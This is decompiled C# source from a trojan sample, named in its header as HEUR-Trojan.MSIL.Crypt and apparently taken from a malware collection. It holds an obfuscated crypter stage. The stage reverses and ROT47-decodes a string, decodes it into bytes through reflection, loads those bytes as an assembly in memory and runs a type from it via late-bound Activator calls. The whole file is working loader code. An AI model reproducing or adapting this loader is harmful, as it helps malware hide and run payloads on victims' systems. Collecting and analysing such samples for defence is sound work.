// Decompiled with JetBrains decompiler
// Type:  
// Assembly: CustomQueryInterfaceResult, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3C313905-EBD1-4523-EACC-B48B0BED3910
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan.MSIL.Crypt.gen-1b49da172b79de32c6df4e87385e57c0e3768b0b227b84cc38cd746b05200720.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Reflection;
using System.Runtime.CompilerServices;

internal sealed class \u000E\u2000
{
  public \u000E\u2000(ushort _param1, bool _param2, bool _param3, string _param4, double _param5)
  {
    _param4 = this.\u0002((object) Strings.StrReverse(_param4));
    this.\u0002((byte[]) Type.GetType(\u0006\u2004.\u0002(670563068)).InvokeMember(\u0006\u2004.\u0002(670563049), BindingFlags.InvokeMethod, (Binder) null, (object) null, new object[1]
    {
      (object) _param4
    }));
  }

  public int \u0002(byte[] _param1)
  {
    object type = (object) ((Assembly) Type.GetType(\u0006\u2004.\u0002(670563008)).InvokeMember(\u0006\u2004.\u0002(670562977), BindingFlags.InvokeMethod, (Binder) null, (object) null, new object[1]
    {
      (object) _param1
    })).GetTypes()[9];
    object[] objArray;
    bool[] flagArray;
    NewLateBinding.LateCall((object) null, typeof (Activator), \u0006\u2004.\u0002(670562964), objArray = new object[2]
    {
      type,
      (object) new object[3]
      {
        (object) \u0008\u2001.\u0002,
        (object) \u0008\u2001.\u0003,
        (object) \u0006\u2004.\u0002(670562945)
      }
    }, (string[]) null, (Type[]) null, flagArray = new bool[2]
    {
      true,
      false
    }, true);
    if (flagArray[0])
      RuntimeHelpers.GetObjectValue(objArray[0]);
    return 2048;
  }

  private string \u0002(object _param1)
  {
    object Limit = (object) Strings.Len(RuntimeHelpers.GetObjectValue(_param1));
    object Left1 = (object) string.Empty;
    object Counter;
    object LoopForResult;
    object CounterResult;
    if (ObjectFlowControl.ForLoopControl.ForLoopInitObj(Counter, (object) 1, Limit, (object) 1, ref LoopForResult, ref CounterResult))
    {
      do
      {
        object Left2 = (object) Strings.Asc(Strings.Mid(Conversions.ToString(_param1), Conversions.ToInteger(CounterResult), 1));
        if (Conversions.ToBoolean(Operators.AndObject(Operators.CompareObjectGreaterEqual(Left2, (object) 33, false), Operators.CompareObjectLessEqual(Left2, (object) 126, false))))
          Left1 = Operators.ConcatenateObject(Left1, typeof (Strings).InvokeMember(\u0006\u2004.\u0002(670562919), BindingFlags.InvokeMethod, (Binder) null, (object) null, new object[1]
          {
            Operators.AddObject((object) 33, Operators.ModObject(Operators.AddObject(Left2, (object) 14), (object) 94))
          }));
        else
          Left1 = Operators.ConcatenateObject(Left1, typeof (Strings).InvokeMember(\u0006\u2004.\u0002(670562919), BindingFlags.InvokeMethod, (Binder) null, (object) null, new object[1]
          {
            Left2
          }));
      }
      while (ObjectFlowControl.ForLoopControl.ForNextCheckObj(CounterResult, LoopForResult, ref CounterResult));
    }
    return Conversions.ToString(Left1);
  }
}
